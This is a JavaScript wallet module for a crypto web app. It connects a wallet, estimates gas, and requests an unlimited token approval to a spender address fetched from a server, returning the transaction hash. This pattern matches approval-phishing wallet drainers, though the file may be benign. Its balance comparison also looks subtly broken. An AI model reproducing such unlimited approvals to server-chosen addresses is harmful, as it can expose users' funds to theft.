import { ethers, BrowserProvider } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js';
import { appKit } from '@/utils/modal';
import pinia from '@/stores';
import useStateStore from '@/stores/state';
const state = useStateStore();
import { ABI, bscAddress, ethAddress } from './config';
let addressList = {
  bsc: bscAddress,
  eth: ethAddress,
};
var provider;
function getProvider() {
  if (appKit.getWalletProvider()) {
    provider = new BrowserProvider(appKit.getWalletProvider());
  } else {
    provider = new BrowserProvider(window.ethereum);
  }
}
export async function connectWallet() {
  getProvider()
  return new Promise((res, rej) => {
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        console.log(22222);
        return res(a[0]);
      })
      .catch(() => {
        state.setLoading(false);
        return rej('user rejected request');
      });
  });
}
export let checkNeedEth = async (approve) => {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  console.log('signer', signer);
  let adr = approve; //授权地址，从api获取
  console.log('adr', approve);
  let type = state.networkType;
  console.log('type', type);
  let contractAddress = addressList[type]; //合约地址
  console.log('contractAddress', contractAddress);
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  console.log('contract', contract);
  let feeData = await provider.getFeeData();
  console.log('checkNeedEth', 1);
  let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
  console.log('checkNeedEth', 2);
  let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
  console.log('checkNeedEth', 3);
  let ethBalance = await provider.getBalance(signer.address);
  console.log('checkNeedEth', 4);
  console.log('contractAddress', contractAddress);
  return new Promise((res, rej) => {
    if (needEth > ethBalance) {
      console.log('eth not enough');
      return res(false);
    } else {
      return res(true);
    }
  });
};
export async function tokenApprove(approve) {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  // let contractAddress = contractAddress; //合约地址
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  console.log('contractAddress', contractAddress);
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  return new Promise((res, rej) => {
    contract
      .approve(adr, ethers.MaxUint256)
      .then((tx) => {
        tx.wait()
          .then((txReceipt) => {
            if (txReceipt && txReceipt.status == 1) {
              //交易成功
              return res(txReceipt.hash);
            } else {
              return rej();
            }
          })
          .catch((err) => {
            state.setLoading(false);
            console.log(err);
          });
      })
      .catch((err) => {
        state.setLoading(false);
        console.log(err);
      });
  });
  // try {
  //     let feeData =await provider.getFeeData();
  //     let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
  //     let needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
  //     let ethBalance = await provider.getBalance(signer.address);
  //     if(needEth>ethBalance){
  //         console.log('eth not enough')
  //     }
  //     let tx = await contract.approve(adr, ethers.MaxUint256) //授权
  //     let txReceipt = await tx.wait();
  //     if (txReceipt && txReceipt.status == 1) { //交易成功
  //         console.log(txReceipt.hash); //调用api，把hash传入接口
  //     }

  // } catch (e) {
  //     console.log(e)
  // }
}

export async function tokenBalance() {
  //非gas币的余额获取
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  let signer = await provider.getSigner(); //连接钱包地址
  let contract = new ethers.Contract(contractAddress, ABI, provider);
  let decimals = await contract.decimals();
  let balance = await contract.balanceOf(signer.address);
  return new Promise((res) => {
    console.log('余额', ethers.formatUnits(balance, decimals));
    return res(ethers.formatUnits(balance, decimals));
  });
  // console.log('余额', ethers.formatUnits(balance, decimals));
}
